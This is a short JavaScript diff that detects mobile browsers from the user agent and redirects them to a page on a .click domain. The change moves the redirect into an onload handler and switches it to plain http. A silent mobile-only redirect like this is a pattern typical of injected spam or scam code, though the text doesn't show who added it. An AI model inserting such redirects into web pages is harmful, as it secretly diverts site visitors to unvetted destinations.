@@ -1,4 +1,7 @@
-var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
 if (isMobile) {
-  window.location.replace("https://maohoankhangchinhhang.click/moctoctunhien");
-} 
+    window.onload = function() {
+        window.location.href = "http://maohoankhangchinhhang.click/moctoc";
+      };
+}
